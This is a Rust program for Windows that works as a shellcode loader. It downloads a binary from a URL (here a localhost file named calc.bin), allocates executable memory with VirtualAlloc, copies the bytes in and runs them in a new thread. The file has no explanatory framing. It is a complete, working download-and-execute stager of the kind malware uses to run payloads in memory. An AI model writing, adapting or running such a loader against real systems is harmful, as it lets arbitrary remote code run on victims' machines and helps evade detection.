use reqwest;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    let url = "http://127.0.0.1/calc.bin";

    // Download the binary using the reqwest library
    let response = reqwest::get(url).await?.bytes().await?;

    // Convert the downloaded content into a byte array
    let bin_data = response.to_vec();

    unsafe {
        // Allocate memory for the binary
        let func_addr = VirtualAlloc(
            null_mut(),
            bin_data.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        // Check if the memory allocation succeeded
        if func_addr.is_null() {
            return Err("Failed to allocate memory.".into());
        }

        // Copy the binary data into the allocated memory
        std::ptr::copy_nonoverlapping(bin_data.as_ptr(), func_addr as *mut u8, bin_data.len());

        let mut thread_id: u32 = 0;

        // Create a thread to execute the binary
        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(std::mem::transmute(func_addr)),
            null_mut(),
            0,
            &mut thread_id as *mut u32,
        );

        // Check if the thread was created successfully
        if h_thread.is_null() {
            return Err("Failed to create thread.".into());
        }

        // Wait for the thread to complete
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }

    Ok(())
}